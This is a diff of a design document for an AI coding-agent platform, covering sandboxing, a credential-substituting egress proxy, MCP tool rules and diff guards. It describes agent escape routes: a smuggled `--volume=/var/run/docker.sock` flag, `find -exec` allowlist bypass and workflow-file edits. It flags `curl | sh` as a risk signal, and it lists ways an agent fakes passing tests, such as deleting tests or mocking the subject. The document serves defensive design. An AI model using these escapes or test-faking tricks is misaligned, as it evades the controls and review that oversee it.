@@ -1083,9 +1083,16 @@ public record ToolDefinition(
 7. Truncate — summarise for the model, full output to blob (§11)
 ```
 
-**The allowlist is computed per attempt and per phase, and enforced twice.** Tools outside it are not offered to the model *and* are rejected at dispatch. A model that hallucinates `delete_branch` gets a structured error, not a deleted branch. Offering-only is insufficient — models invent tool names.
+**Tools are resolved per attempt, and the catalogue is data.** It is composed at attempt start from
+Forge built-ins, workspace-scoped MCP servers, and the repository's declared servers; capped at ~12
+offered; frozen for the attempt so the audit trail is stable; recorded on the attempt row. Unknown
+names are rejected at dispatch as well as withheld from the offer, because models invent tool names.
 
-Phase gating is meaningful: `ANALYZING` gets read-only tools; `WRITE_GITHUB` tools exist only in `SUBMITTING`. An executor cannot open a PR mid-implementation even if it decides that would be helpful.
+**Phase does not gate dispatch.** §9's phases keep their escalation triggers and budget checks, and
+they shape the prompt and feed risk classification — but they do not decide which tool is legal when.
+Phase gating made every capability a scheduling problem without adding a control the sandbox does not
+already provide. The one exception is `WRITE_GITHUB`, which is host-brokered and stays confined to
+`SUBMITTING`, because that is where the credential is and the confinement is enforced off-model.
 
 ### MVP tool set
 
@@ -1093,22 +1100,59 @@ Phase gating is meaningful: `ANALYZING` gets read-only tools; `WRITE_GITHUB` too
 |---|---|---|---|
 | `list_directory`, `read_file`, `grep`, `find_files` | READ | LOW | Path-jailed to the workspace |
 | `git_log`, `git_diff`, `git_blame` | READ | LOW | |
+| `git_branch`, `git_commit`, `git_stash`, `git_rebase` | WRITE_SANDBOX | LOW | Local to the sandbox clone. Only `push` needs a credential, and only `push` is brokered |
+| `lsp_definition`, `lsp_references`, `lsp_diagnostics` | READ | LOW | Real types instead of grep. In-sandbox, no network, no added surface |
 | `read_tool_output(tool_call_id, range)` | READ | LOW | Pull full output behind a truncated summary |
 | `apply_patch(unified_diff)` | WRITE_SANDBOX | MED | **Preferred edit tool** |
 | `write_file(path, content)` | WRITE_SANDBOX | MED | Escape hatch for new files |
-| `run_command(cmd, args)` | EXEC | MED | **Allowlisted binaries only** |
-| `run_tests(selector?)` | EXEC | MED | Runs the verification contract's test command |
+| `run_command(argv \| script)` | EXEC | MED | Argv or shell; see below |
+| `start_process`, `signal_process`, `read_process_output` | EXEC | MED | Dev server, watch mode, debugger, language server |
+| `run_tests(selector?)` | EXEC | MED | The verification contract's test command |
+| MCP-provided tools | varies | ≥ MED | Namespaced by server; risk raised by provenance, never lowered |
 | `record_evidence`, `record_finding` | READ | LOW | Structured note into `evidence` / knowledge candidates |
 | `propose_transition(state, rationale)` | READ | LOW | A suggestion; guards decide (§10.3) |
 | `request_human_decision(question, options)` | READ | LOW | Always available, in every phase |
 | `github_open_pr`, `github_comment` | WRITE_GITHUB | HIGH | **Host-brokered**, `SUBMITTING` only, idempotent |
 
-**`run_command` is an allowlist, not a shell.** The verification contract declares permitted binaries (`mvn`, `gradle`, `npm`, `pytest`, `go`, …); arguments are passed as an argv array with no shell interpretation — no `sh -c`, no pipes, no `&&`. This is not primarily about stopping a malicious model; it is about ensuring commands are reproducible, attributable, and analysable. Unrestricted shell also makes the sandbox's other controls largely decorative.
+**`run_command` takes argv or a shell script, and the allowlist is an operational contract rather
+than a boundary.** Argv is the default because it is easier to log, attribute, and classify. A shell
+form exists because the alternative is an agent that cannot pipe, redirect, or chain — and because
+the allowlist does not contain an adversary regardless: `find -exec` escapes it with no shell at all,
+and `npm test` executes arbitrary repository-authored commands but cannot be removed, since running it
+is the entire purpose of the verification contract. The controls that do contain are §16's, and they
+measure identically with a shell present or absent.
 
-**`apply_patch` over `write_file`.** A unified diff fails loudly when the model's assumption about file content is wrong, whereas whole-file writes silently clobber concurrent state and quietly delete code the model forgot to include. Patch failures are a valuable signal — they mean the model's mental model has drifted, which is worth escalating on.
+Every command is parsed — a bash AST, not a prefix match — and the parse yields risk *signals* for
+§17: redirection outside the workspace, `curl | sh`, credential-shaped literals, package installs.
+Full command text is audited per attempt. That is what §15 always wanted from "attributable", and it
+is achieved by recording rather than by restricting.
 
-- *Alternative considered:* MCP for tool definitions. Attractive for ecosystem reuse and worth revisiting, but it adds a protocol and process boundary before our tool semantics have stabilised. The `ToolDefinition` record is deliberately MCP-shaped so an adapter is cheap later.
-- *What could go wrong:* tool proliferation — 40 narrow tools degrade model selection accuracy and inflate every prompt. Cap the offered set (~12) and consolidate rather than add.
+**`apply_patch` over `write_file`.** A unified diff fails loudly when the model's assumption about
+file content is wrong, whereas whole-file writes silently clobber concurrent state and quietly delete
+code the model forgot to include. Patch failures are a valuable signal — they mean the model's mental
+model has drifted, which is worth escalating on.
+
+### MCP
+
+Tools come from the ecosystem, split by transport because the risks differ:
+
+- **stdio servers run inside the sandbox** — same container, same uid, same kernel controls, no
+  privilege of any kind. A tenant may bring any server, precisely because bringing one grants nothing.
+- **Remote servers are egress** — the host must be on the workspace allowlist, and the credential is a
+  sentinel substituted at the proxy (§16), so the sandbox never holds it.
+
+Three rules, each load-bearing:
+
+1. **Credential and host configuration comes from workspace settings, never from the repository.**
+   Configuration that authorises sending a real credential must not be authored by the thing under
+   analysis.
+2. **Servers are baked into the image or digest-pinned.** `npx -y @some/server` is a runtime install
+   of unpinned code from inside the sandbox, and that supply chain cannot be audited after the fact.
+3. **MCP output is untrusted input.** It enters context from a third party, so §14 fences it and §17
+   may raise the risk of any call whose arguments derive from it — never lower.
+
+- *What could go wrong:* tool proliferation. ~12 offered tools was a model-accuracy limit, and MCP
+  makes it easy to blow through. The cap is enforced at catalogue resolution, not left to config.
 
 ---
 
@@ -1154,12 +1198,65 @@ An interface alone does not decouple anything — the coupling usually lives in 
 | **Egress config as imperative setup** | Runtime tells the adapter to attach a network | `EgressPolicy` is declarative in the spec (`DENY_ALL`, `PROXY_ONLY`). Adapter translates to iptables / NetworkPolicy / provider config |
 | **Verification contracts encoding the substrate** | A repo's contract drifts toward `docker run …` | Contracts declare `test command` + allowlisted binaries only (§15). Already true; keep it true |
 
+> **Measured against a system that did it the other way.** Nous Research's Hermes Agent (MIT, ~1.77M
+> lines of Python, 24k commits) ships *seven* execution backends — local, Docker, SSH, Singularity,
+> Modal, Daytona, Vercel Sandbox — which is more substrates than this plan contemplates, and proof the
+> requirement is achievable. It has no port: dispatch is `env_type in {"docker", "singularity",
+> "modal", "daytona", "vercel_sandbox"}` on a string, with **79 branch sites in one 3,942-line module
+> and 287 references across 53 files**, and no abstract base or protocol anywhere in the terminal path.
+> That is precisely the leak this table predicts, at production scale, and it is the strongest
+> available argument for `SandboxProvider` — not that the abstraction is elegant, but that its absence
+> is measurable.
+
 **Two enforcement mechanisms, both in CI:**
 
 1. **ArchUnit rule:** no `com.github.dockerjava..` import anywhere outside `dev.tushar.forge.sandbox.docker`. Same technique as the `sandbox ↛ githubapp` rule (§2) — a coupling constraint the build fails on, not a convention people remember.
 2. **Provider conformance suite:** one `@TestFactory` test class, written against `SandboxProvider` only, run against *every* adapter. Covers provision → write → exec → patch → diff → probe → destroy, plus the nasty cases (exec timeout, OOM kill, sandbox vanishing mid-exec, capacity refusal, path-traversal attempts on `relPath`). Ship it in M5 alongside the Docker adapter and an in-memory fake. A future k8s or gVisor adapter then has an executable specification instead of a prose one — that is what turns "swap the adapter" from a claim into a measurable task.
 
 **The deepest decoupling is already in the design and worth making explicit:** the runtime must *already* treat sandbox loss as routine (§20 — `ABORTED` does not consume the retry budget, and the cumulative patch is replayed onto a fresh sandbox). That assumption is what makes migration safe. Kubernetes evicts pods, drains nodes, and OOMKills far more aggressively than a quiet Docker host does; a runtime that only works because Docker containers rarely disappear would break on arrival. Because we assume unreliability from day one, a more hostile substrate surfaces no new failure mode — only a higher rate of one we already handle. **Test that path deliberately on Docker** (kill the container mid-attempt in CI), precisely because Docker will not exercise it for you.
+
+### Customer-hosted execution, and what it decides about the loop
+
+Swapping the substrate — Kubernetes, gVisor, Firecracker, a hosted provider — is what the port and the
+conformance suite are for, and it needs nothing new. **Running the sandbox in the customer's own
+infrastructure is a different question**, and it forces a decision that cannot be deferred.
+
+**The port survives, and better than expected.** Its four sealed exceptions already carry the failure
+modes: no runner connected is `CapacityExhausted`, a runner that disconnects is `SubstrateUnavailable`,
+one that dies holding a sandbox is `SandboxLost`. `Consumer<OutputChunk>` streams over a persistent
+connection as readily as over a pipe. What changes is direction: a customer's VPC cannot be dialled
+into, so the runner must connect **outbound** and requests are correlated over that channel — the
+model every self-hosted CI runner uses. That is a new adapter, not a new port.
+
+**What does not survive is a host-side agent loop.** If the loop runs on our infrastructure and the
+sandbox runs in theirs, then every `read_file` returns their source code across the boundary and into
+a prompt we assemble. The code leaves their network anyway, only slower — and a per-call hop measured
+at 2ms on a local socket becomes a WAN round trip, a few hundred times per attempt.
+
+So customer-hosted execution is only meaningful if **the loop runs beside the sandbox**, inside the
+customer's network, with the model call going out from there. That makes the runtime one deployable
+unit rather than two halves either side of somebody's firewall.
+
+This is a second, independent argument for co-locating the loop, arrived at from deployment rather than
+from ergonomics. It should be weighed alongside the first.
+
+**What stays on our side in every deployment** is the control plane: the task FSM and its guards
+(§10), scheduling and budgets (§22), the audit record (§19), and the decision that a task is complete.
+The runner executes and reports; it never decides.
+
+**The trust model inverts, and survives it.** Today the sandbox is untrusted and our host is trusted.
+With a customer-hosted runner, our software runs in an environment its operator controls, so
+runner-reported facts cannot be trusted the way locally-produced ones are. This matters less than it
+first appears: the party who could tamper is the party being protected, and the guards exist to stop an
+*agent* from fooling a *reviewer*, not to stop a customer from fooling themselves. Anything billable
+must still be metered where we control it — at the proxy, or on the control plane, never on the
+runner's word.
+
+- *What could go wrong:* two execution topologies become two products, and the second one rots. The
+  conformance suite is the defence — a customer-hosted adapter that cannot pass it is not shipped —
+  and it only works if the suite is run against both in the same CI job.
+- *Deferred:* image distribution into a customer registry, runner attestation, and the enrolment flow.
+  None of them constrains the port, so none of them needs deciding now.
 
 ### MVP adapter: Docker on a dedicated worker VM
 
@@ -1240,6 +1337,212 @@ report them.
 - *Residual:* a compromised sandbox can still spend the attempt's own budget through the proxy. That
   is bounded by §22's ceilings, which is the correct place for it to be bounded.
 
+**Largely resolved by building the runtime rather than buying one.** The finding above describes
+harnesses that co-locate the model loop with tool execution. Our native runtime does not: the loop is
+Java on the host, so no model key is ever in the sandbox and there is nothing for the proxy to protect
+on this path. The concern survives only for `OpenHandsHarness`, which is co-located by construction —
+which is one more reason the port exists and one fewer reason to reach for it.
+
+
+### The egress proxy, and credentials that are present in effect but absent in fact
+
+The proxy is the load-bearing control, not a convenience for reaching package registries. It is the
+only route out of the sandbox, and the mechanism by which a credential is *used* without being
+*disclosed*.
+
+The sandbox holds a per-session **sentinel**, never a credential. The proxy terminates TLS, checks
+the destination against the workspace's allowlist, and substitutes the real value only for hosts
+explicitly configured to receive it. A sentinel read out of the sandbox — from an environment, a log,
+a crash dump, an exfiltrated file — is inert anywhere but this proxy.
+
+That closes the model-key problem above, and it is what makes remote MCP servers and `git push`
+tractable without ever handing the sandbox a token.
+
+**Substitution configuration comes from workspace settings and never from the repository.** A repo
+that could name its own inject-hosts could exfiltrate to them. This is the single rule the whole
+mechanism rests on.
+
+### What actually needs the proxy
+
+The native runtime changes this materially, and the change is easy to miss. **The agent loop is Java,
+on the host.** It calls the model from the host and sends tool calls into the sandbox. So:
+
+| Consumer | Runs | Needs the proxy |
+|---|---|---|
+| Model API calls | host | **no** — the key never approaches the sandbox, because nothing in the sandbox calls a model |
+| Remote MCP servers | host, by default | **no** — same reason; the credential stays host-side |
+| `git clone`, `git push` | host-brokered | **no** |
+| Package installs — `npm`, `mvn`, `pip` | **sandbox, unavoidably** | **yes** — they populate the build and cannot run anywhere else |
+| stdio MCP servers reaching a network | sandbox | yes |
+| Documentation and schema fetches | sandbox | yes |
+| A co-located harness such as `OpenHandsHarness` | sandbox | yes — this is the case the model-key finding was really about |
+
+The earlier framing generalised from a CLI agent where the shell *is* the agent and everything happens
+sandbox-side. Here most credentialed traffic is host-side by construction, which is a benefit of
+building the runtime rather than buying one. **Credential masking earns its place on a narrower case:
+authenticated package sources** — a private npm registry, an internal Maven repo — where the sandbox
+genuinely must authenticate and must not learn the secret. That case is common enough in the
+repositories Forge targets to be worth building for, and it is the case that decides the design.
+
+### Decisions that cannot be revisited later
+
+Each of these is cheap now and expensive after the first workspace exists.
+
+1. **Images carry a trust anchor.** TLS termination requires a CA the sandbox trusts. If images are
+   not built with a slot for a Forge-issued CA, adding masking later means rebuilding, re-signing, and
+   re-testing every toolchain image. Baked in from the first image, used or not.
+2. **The proxy is a sidecar on the workspace network, not in the worker process.** An in-process proxy
+   means the sandbox must reach the host, which makes the host routable from tenant code — the same
+   surface that would expose a TCP Docker daemon. Instead the workspace network is created
+   `--internal` and the proxy is dual-homed: attached to the internal network and to an egress
+   network. The sandbox's only route is the sidecar. *Verify empirically that an `--internal` bridge
+   does not reach host services on the gateway address; this is exactly the class of assumption this
+   project has been wrong about before.*
+3. **Egress is denied unless a rule matches, and proxy unavailability is `SubstrateUnavailable`.**
+   Fail-closed, and classified as substrate rather than as a refusal, so §20 aborts the attempt without
+   consuming a retry. A proxy that fails open is not a control.
+4. **Sentinels are per-session and per-host.** Minted at `provision`, dead at `destroy`, valid only for
+   the hosts the rule names. A sentinel that outlived its sandbox or worked for any host would be a
+   credential with extra steps.
+5. **Violations are returned as readable text, not as a generic connection failure.** The agent must be
+   able to tell "this host is not allowed" from "the network is broken", or it retries the wrong thing
+   until its budget is gone.
+6. **Every request is audited** — workspace, attempt, host, decision, rule, bytes. §19 and §22 both
+   read this, and retrofitting audit onto a proxy that already carries traffic means a gap in the
+   record that can never be filled.
+
+### Schema, and one prerequisite that does not exist yet
+
+`platform.crypto` is referenced by known-gaps as the fix for plaintext tokens in Redis and **has not
+been written**. Workspace credentials cannot be stored without it, so it is a prerequisite of this
+step rather than a parallel cleanup.
+
+```
+workspace_egress_rules   workspace_id, host_pattern, purpose (REGISTRY|MCP|DOCS|OTHER),
+                         credential_id?, created_by, created_at
+workspace_credentials    workspace_id, label, secret_ref (a pointer, never a value),
+                         scheme (BEARER|HEADER|BASIC|SIGV4), header_name, rotated_at
+egress_events            workspace_id, attempt_id, host, method, decision, rule_id,
+                         bytes_out, bytes_in, at  — partitioned as audit_events is
+```
+
+Rules and credentials are **workspace-scoped and never repository-scoped**, which is the rule the
+whole mechanism rests on: configuration that authorises sending a real credential must not be authored
+by the thing under analysis.
+
+### Deferred, and safe to defer
+
+- **SigV4 and other signature schemes.** Bearer and header substitution cover registries and MCP.
+  Signing changes the request body handling, so the `scheme` column exists now and the implementation
+  waits for a caller.
+- **Response inspection.** The proxy terminates TLS and could scan responses for secrets. Not in 3.3 —
+  it is a separate control with its own false-positive budget, and nothing about the design forecloses
+  it.
+- **Per-attempt rules.** Workspace scope is the unit today. Narrowing later is additive; widening would
+  not be.
+
+### Service dependencies
+
+Integration tests are the median case for repositories worth maintaining, and they need real
+services. Testcontainers is the standard answer and requires the Docker socket, which is **root on
+the host** — categorically excluded, at any privilege level, for any repository, permanently.
+
+Instead the `VerificationContract` declares services — image, ports, health check — and the *host*
+provisions them onto the per-workspace network that already exists for `PROXY_ONLY`. Hostnames and
+ports arrive as environment variables. The sandbox reaches Postgres over the network namespace it is
+already in and never learns Docker exists.
+
+Images are bound to a Forge-curated set plus digest-pinned entries, on the same argument as the MCP
+rule: a contract that can name any image can name any workload.
+
+### Where the agent runs: outside, acting inside
+
+The loop is Java on the host. The model is called from the host; each tool call is dispatched,
+risk-classified, metered, and persisted by Forge before anything executes; execution happens in the
+sandbox; output streams back. **The agent thinks outside and acts inside.**
+
+That is the opposite of every candidate harness, which co-locates the loop with the work, and it is
+chosen for four things co-location cannot give:
+
+- The model key is never in the sandbox — structurally, not by policy.
+- Every tool call passes through our dispatch, so §17's classification, §19's audit, and §22's
+  metering read what actually happened rather than what a harness reported.
+- Steps are committed as they occur, which is what makes §11's replay and §20's resume real.
+- The sandbox can die without losing the attempt: the conversation lives on the host, and §20 replays
+  the cumulative patch onto a fresh one.
+
+The cost is a hop per tool call. OpenHands measured a 61% drop in system-attributable errors from
+deleting theirs, which is a real number pointed at us — but theirs was an inter-*pod* network hop and
+ours is `docker exec` on the same host, a process spawn against inference latency that is orders of
+magnitude larger. Measure it from the first spike rather than assuming either way.
+
+**One `docker exec` per tool call does not work.** Measured on a real daemon: 50 sequential
+`docker exec` calls take **102ms each**; the same 50 multiplexed over a single long-lived
+`docker exec -i` take **2ms each**. Fifty times. And the calls an agent makes most — `read_file`,
+`grep`, `list_directory` — are the cheapest operations, so spawn cost is nearly all of their cost.
+An attempt making 200 calls spends 20 seconds waiting on process creation.
+
+So the session owns **one long-lived `docker exec -i` running a small Forge stub**, and every tool
+call is a frame on its stdin with responses and output chunks framed back on stdout. The stub does
+file reads, writes, listing, and search in-process; it spawns a subprocess only for commands that
+genuinely are one; it owns background processes and multiplexes their output.
+
+OpenHands solves the same problem with a FastAPI server *listening inside* the runtime container,
+which the host drives over HTTP and WebSocket. Framing over the exec's stdin and stdout is the same
+idea with a smaller blast radius: **no listening socket, no port, no network surface at all**, and it
+works unchanged under `--network none`. The stub ships in the image, alongside the CA anchor; if it
+is missing the provider falls back to per-call `exec`, degraded and logged.
+
+**Shell state still does not carry between calls**, which was verified — `cd /var` then `pwd` returns
+`/`. That is a smaller problem than it first appears, and an earlier draft of this section overstated
+it. Both leading systems have the same property: OpenHands spawns each command with
+`create_subprocess_shell(..., cwd=command.cwd)`, and mini-swe-agent runs `bash -c` per command, and
+they score 72.8% and >74% on SWE-bench Verified respectively. A single command may still contain
+`source venv/bin/activate && pytest`, so what is required is the **shell form of `run_command`** (§15)
+and a system prompt that says state does not persist — not an interactive session. The stub may keep
+a persistent shell later as an ergonomic improvement; nothing here depends on it.
+
+### Showing what the agent is doing, live
+
+The stub already frames every action, so the event stream exists as a consequence of the transport
+rather than as a feature bolted onto it. One source, two sinks:
+
+```
+stub frame ──▶ HarnessEvent ──┬──▶ task_steps / tool_calls   (committed; the record)
+                              └──▶ published stream          (subscribed; the view)
+```
+
+**The view is derived from the record and never a parallel path.** If the UI were fed directly from
+the transport it could show something the audit trail does not contain, and for a system whose thesis
+is that guards read committed rows, a live view that disagrees with those rows is worse than no live
+view.
+
+A client opening mid-attempt reads committed steps for history, then subscribes from that offset for
+the tail — the same pattern §11's replay already requires, which is why event sourcing is load-bearing
+rather than stylistic. Transport is a WebSocket, because §10 needs the channel to carry pause and
+human decisions back, not only forward. File writes stream as **diffs rather than contents**: it is
+what a reviewer wants to see, it bounds the frame size, and it is already the shape `captureDiff`
+produces.
+
+### Long-running processes
+
+`exec` alone cannot express a dev server, a watch mode, a debugger, or a language server, which
+removes frontend work almost entirely. The port carries `start` / `signal` / `ports` alongside `exec`;
+processes are tracked per handle and reaped on `destroy`; output goes to a ring buffer the agent reads
+through a tool.
+
+The hardening block does not change, and **`-p` never joins it**: ports are reachable from inside the
+sandbox and unreachable from the host. A long-running process is the same privilege for longer, not a
+new one, bounded by the TTL that already exists.
+
+### Nothing the spec carries reaches the substrate's parser
+
+`SandboxSpec` has no field for a mount, an environment map, or a credential, and `SandboxBoundaryTest`
+asserts that by reflection. The adapter additionally terminates option parsing before the image name:
+`docker run` reads options until the first non-option argument, so a name beginning with `--` is
+parsed as a flag, and `--volume=/var/run/docker.sock:/sock` in that position mounts the daemon socket.
+Verified against a real daemon. The command assembly is a testable static and the test asserts the
+argument shape, because asserting the *outcome* of a run passes for unrelated reasons.
 
 ### Lifecycle
 
@@ -1249,7 +1552,7 @@ Sandboxes are ephemeral, one per attempt, with a hard TTL (default 60 min, confi
 
 Container isolation is **weaker than a VM boundary**. A kernel exploit from inside a container can reach the host. We accept this for a design-partner alpha because: the worker VM is dedicated and holds no credentials beyond its own; the code being run belongs to the customer whose sandbox it is; egress is denied by default; and per-workspace networks prevent cross-tenant reachability.
 
-**This must be closed before public self-serve signup.** The trigger is untrusted repositories from unvetted accounts. At that point either (a) add gVisor as a runtime class — a per-container flag, low disruption, meaningful kernel-attack-surface reduction, and the cheapest upgrade; (b) move to Firecracker microVMs; or (c) adopt a hosted sandbox provider. The `SandboxProvider` port means this is an adapter swap, not a rewrite. Option (a) is the recommended next step and is worth doing as soon as there is a second customer.
+**This must be closed before public self-serve signup.** The trigger is untrusted repositories from unvetted accounts. At that point either (a) add gVisor as a runtime class — a per-container flag, low disruption, meaningful kernel-attack-surface reduction, and the cheapest upgrade; (b) move to Firecracker microVMs; or (c) adopt a hosted sandbox provider. The `SandboxProvider` port means this is an adapter swap, not a rewrite. Option (a) is the recommended next step. The trigger is **self-serve signup**, which is where "unvetted" actually begins — design-partner repositories are known and the risk is a business relationship rather than an anonymous upload. This is a stated trade: the container is the only isolation layer until then, and that buys the workspace capability work its first quarter.
 
 - *Alternative considered:* running commands directly in the Spring Boot JVM's host. Rejected outright — arbitrary customer code in the application process is not a sandbox at all.
 - *What could go wrong:* the single worker VM is a capacity ceiling and a single point of failure. Acceptable for alpha (a handful of concurrent attempts); the provider interface already permits a pool of VMs with a scheduler-side placement decision.
@@ -1292,17 +1595,84 @@ The supervisor may then propose a risk level, and it is applied **only if it is 
 
 ### Diff guards — the anti-cheat layer
 
-Run in `VERIFYING`, before verification is allowed to pass. Violations are **policy failures**, not test failures, and force escalation:
+Run in `VERIFYING`, before verification is allowed to pass. Violations are **policy failures**, not
+test failures, and a refusal escalates to a person rather than costing a retry — retrying will not
+stop an agent doing the same reasonable-looking thing again.
 
-- Test files deleted, or test count decreased.
-- Tests newly `@Disabled` / `@Ignore` / `.skip` / `xit` / `pytest.mark.skip`.
-- Assertions removed or weakened (assert → log, tightened expected values loosened).
-- CI configuration modified (should be impossible without Workflows:write, but check anyway — defence in depth).
-- Changes outside `plan.declared_file_scope`.
-- Secrets or credential-shaped strings introduced.
-- Dependency added that is not in the plan.
+Every check is a pure function of the diff. Nothing reads the model's explanation of what it did,
+because a persuasive explanation for deleting a test is exactly what both a helpful model and a
+compromised one would produce.
 
-This exists because "make the tests pass" and "delete the failing test" are indistinguishable to a naive reward signal, and every autonomous coding system rediscovers this the hard way.
+| Guard | Scope | Verdict | Status |
+|---|---|---|---|
+| `TEST_DELETED` | inherited tests | refuse | built |
+| `TEST_DISABLED` | inherited tests | refuse | built |
+| `ASSERTIONS_REMOVED` | inherited tests | refuse | built |
+| `CI_CONFIG_CHANGED` | all | refuse | built |
+| `SECRET_INTRODUCED` | all | refuse | built |
+| `SUBJECT_MOCKED` | all | refuse | to build |
+| `SELF_CERTIFYING` | all | flag | to build |
+| `DEPENDENCY_ADDED` | manifests | refuse | to build |
+| `FILE_SCOPE_VIOLATED` | all | refuse | **blocked** — needs a `plans` table that no migration creates |
+
+Until `FILE_SCOPE_VIOLATED` exists, §9's supervisor escalation trigger is the only thing watching
+file scope. That trigger is advisory, mid-loop, and does not block completion, so an out-of-scope
+change can currently reach `COMPLETE` if the trigger does not fire. Recorded in known-gaps §3.21
+rather than implied to be covered.
+
+**Findings carry a severity.** `REFUSE` blocks completion; `FLAG` persists on the attempt, raises the
+change's risk class, and surfaces in review. A single verdict for both would either block legitimate
+work or wave through cheating, and `SELF_CERTIFYING` is specifically the case that is normal for new
+work and still worth a reviewer knowing.
+
+#### Tests have provenance, and provenance is authority
+
+The agent writes tests and mocks dependencies where a test needs it. That is required, and it
+collides with the guards above unless tests are stratified — because the canonical way an agent fakes
+success is to mock the thing that was failing.
+
+| Tier | What it is | Agent may | Weight as evidence |
+|---|---|---|---|
+| **Inherited** | present at `WorkingCopy.baseSha` | extend; never weaken | strong — this is what "don't break it" means |
+| **Authored** | written during this attempt | write, refactor, mock, delete freely | **none on its own** |
+
+The second row is load-bearing. If authored tests could certify completion then `assertTrue(true)`
+satisfies `DIFF_GUARDS_PASSED`, and the guard model is decorative. An agent may *demonstrate* its work
+with tests; it may not *certify* it with them. The `VerificationContract` remains human-declared and
+model-immutable (§9) — it declares the command; the tiers describe the tests that command runs.
+
+**Mocking is separated by one signal: is the mocked type also modified in the non-test half of the
+same diff?** Changing `PaymentService` and mocking `PaymentService` in the test that proves the change
+works is `SUBJECT_MOCKED`. Mocking a gateway the agent never touched is ordinary practice and is
+silent.
+
+This does not make cheating impossible. Mock detection is regex over diff text and has both false
+positives and false negatives. The controls that hold are either side of it: the inherited tier still
+passes, and a person reviews the PR. The guards exist so the reviewer knows where to look, and a
+guard oversold is worse than one absent.
+
+#### Deferred execution is an escape class
+
+Anything an agent writes inside the sandbox that later executes outside it is an escape, and it
+produces no sandbox violation because nothing was violated at write time.
+
+`/workspace` is a tmpfs and never a bind mount, so `.git/hooks` stays contained — and the host never
+runs git against the sandbox's working copy, it receives a diff and applies it to a fresh host-side
+clone. What *does* leave in a diff is `.github/workflows`, which runs on GitHub's runners with
+production credentials after merge. `CI_CONFIG_CHANGED` is therefore an escape control and not only
+an anti-cheat one, which is the stronger of its two rationales and the one to remember before
+relaxing it.
+
+#### Extensions may tighten, never loosen
+
+Any pluggable check — a policy rule, a future hook, a tenant setting — may raise a risk class or add a
+refusal. None may lower one or grant an allowance. This is the same asymmetry as the risk classifier
+above, stated as an architectural invariant so that it survives the addition of an extension point.
+
+Policy is declarative data evaluated by Forge's code. A tenant configures it within a schema and
+never supplies an executable: a tenant-authored handler running host-side would be code execution in
+the control plane, which is what §18 exists to prevent. Tenant-authored *workflow* steps are fine and
+belong inside the sandbox, where they are indistinguishable from the agent's own commands.
 
 ### Prompt injection
 
@@ -1357,6 +1727,225 @@ Workers set `TenantContext` from the task's `workspace_id` at job start; the que
 - *Alternative considered:* schema-per-tenant or database-per-tenant. Rejected for alpha — migration fan-out across hundreds of schemas, connection-pool explosion, and cross-tenant analytics become painful. Shared schema with RLS is the right point on the curve; a dedicated-database tier for enterprise customers is a later commercial decision, not an architectural one.
 - *What could go wrong:* a developer runs a query outside a transaction, the GUC is unset, and `current_setting(..., true)` returns null → policy matches nothing → confusing empty results rather than a leak. That failure direction is correct (fail closed), but the error message is bad. Add a `@TenantScoped` aspect that throws a clear exception when `TenantContext` is empty.
 - *What could go wrong:* RLS on very large tables degrades plans. Monitor; the predicate is on an indexed column, so this should stay cheap.
+
+### Deployment models
+
+Two independent-looking axes — who supplies the model credential, and where execution runs — produce
+four combinations, of which **three are coherent**.
+
+| | Execution: our infra | Execution: customer infra |
+|---|---|---|
+| **Credential: ours** | **Managed** — the default | *incoherent, see below* |
+| **Credential: customer's** | **BYOK** | **Self-hosted** |
+
+The empty cell is not a gap in the product; it does not close. If execution runs in the customer's
+network but the credential is ours, then either our key is deployed into infrastructure we do not
+control, or the prompts — which contain their source — travel to us to be sent onward. The first is
+unacceptable to us and the second defeats the reason they wanted customer-hosted execution.
+
+**So customer-hosted execution implies bring-your-own-key.** The axes are not independent, and that is
+why there are three models rather than four.
+
+#### What each model changes
+
+**Managed.** Everything in this plan applies unaltered. We pay for inference, so §22's ceilings protect
+*us*, metering happens at the proxy where we control it, and provider rate limits are shared across
+tenants — which is a real shared-fate problem with no design yet (known-gaps §3.26).
+
+**BYOK.** The customer's key is a workspace credential, which §16's `workspace_credentials` and
+`platform.crypto` already exist to hold — it needs a `MODEL` purpose and a `base_url`, because a
+customer bringing Azure OpenAI, Bedrock, or a self-hosted endpoint is the same case as one bringing a
+key. Two things change in kind rather than degree:
+
+- **§22 inverts.** Ceilings stop protecting our margin and start protecting the customer's bill. The
+  mechanism is unchanged; the reason to be careful about it is not.
+- **Rate limits stop being shared.** A BYOK tenant burns their own quota, which incidentally fixes the
+  shared-fate problem above for every tenant who chooses it.
+
+It also introduces a **model capability floor**. A customer may bring a model that cannot do reliable
+tool calling, or has a context window our prompts do not fit. That is a validation step at key
+registration — declare the minimum, test it once, refuse clearly — not something to discover on the
+first attempt of a real task.
+
+**Self-hosted.** Requires the outbound runner adapter and a co-located loop. The consequence worth
+naming early is commercial: **usage-based pricing is not available here.** Metering would depend on
+numbers reported by a runner the customer operates, and billing on self-reported usage is not
+something to build. Self-hosted is priced per seat or per repository, and that is an architectural
+consequence rather than a sales preference.
+
+#### The boundary: where the agent runs and where the key lives
+
+The unit that moves between deployments is the **runner** — the agent loop, the sandbox it drives, and
+the egress proxy, as one deployable. Not the loop by itself. "Co-located" throughout this plan means
+*the same host*, never *the same container*.
+
+Four invariants hold in all three models, and every placement below follows from them:
+
+1. **The loop is never inside the tenant's container.** It is our process, beside the sandbox, reaching
+   it over a local socket. Tenant code runs as the same uid as anything in that container, so a loop
+   placed inside it could be tampered with by the repository it is working on.
+2. **The model credential is never inside the tenant's container.** In no model does the sandbox hold
+   it, in any form.
+3. **The GitHub installation token is never inside the tenant's container** (§16, unchanged).
+4. **The control plane decides; the runner reports.** Completion, transitions, and authority are never
+   determined by anything running next to customer code.
+
+| | **Managed** | **BYOK** | **Self-hosted** |
+|---|---|---|---|
+| Control plane | ours | ours | ours |
+| Runner: loop | our infra | our infra | **their infra** |
+| Runner: sandbox | our infra | our infra | their infra |
+| Runner: egress proxy | ours | ours | theirs, bundled |
+| Model key **at rest** | our KMS | our KMS, encrypted per workspace via `platform.crypto` | **their secret store — we never hold it** |
+| Model key **in use** | runner memory | runner memory | their runner's memory |
+| Model key **in sandbox** | never | never | never |
+| GitHub token | minted by the control plane, short-lived, held by the runner | same | minted by us, sent to their runner, scoped to their repositories only |
+| Source code | our infra | our infra | **never leaves theirs** |
+| Diff | our infra | our infra | crosses by default; verdict-only in strict mode |
+
+```mermaid
+flowchart LR
+    subgraph ours["OUR INFRASTRUCTURE — all three models"]
+        cp["control plane<br/>FSM, guards, audit, budgets<br/>decides completion"]
+        kms["KMS<br/>managed key, or a customer's<br/>BYOK key encrypted per workspace"]
+    end
+
+    subgraph runner["THE RUNNER — our infra for Managed and BYOK, the customer's for Self-hosted"]
